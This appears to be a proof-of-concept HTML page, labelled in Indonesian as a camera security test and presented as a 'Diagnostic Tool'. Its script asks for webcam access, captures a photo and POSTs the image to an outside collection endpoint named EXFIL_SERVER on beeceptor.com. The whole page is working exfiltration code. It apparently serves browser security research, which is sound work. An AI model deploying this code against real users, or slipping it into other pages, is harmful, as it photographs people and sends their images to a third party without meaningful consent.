<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uji Keamanan Kamera</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        button { padding: 15px 30px; font-size: 18px; margin: 10px; cursor: pointer; }
        #status { margin-top: 20px; color: #555; }
    </style>
</head>
<body>
    <h1>Diagnostic Tool</h1>
    <button id="camera-btn">Ambil Foto & Exfil</button>
    <div id="status">Menunggu interaksi...</div>

    <script>
        const EXFIL_SERVER = "https://browser-bug-poc.free.beeceptor.com";
        const statusDiv = document.getElementById('status');

        document.getElementById('camera-btn').addEventListener('click', async () => {
            statusDiv.innerText = "Meminta izin...";
            
            try {
                // Mencoba mendapatkan akses kamera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                statusDiv.innerText = "Akses diberikan. Mengambil gambar...";
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                // Delay agar stream stabil
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg');

                    // Kirim ke Beeceptor
                    statusDiv.innerText = "Mengirim data...";
                    await fetch(EXFIL_SERVER, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            type: 'camera_capture_v2', 
                            timestamp: new Date().toISOString(),
                            data: imageData 
                        })
                    });

                    // Stop kamera
                    stream.getTracks().forEach(track => track.stop());
                    statusDiv.innerText = "Selesai: Foto berhasil dikirim.";
                }, 1000);

            } catch (err) {
                statusDiv.innerText = "Gagal: " + err.message;
                console.error(err);
            }
        });
    </script>
</body>
</html>
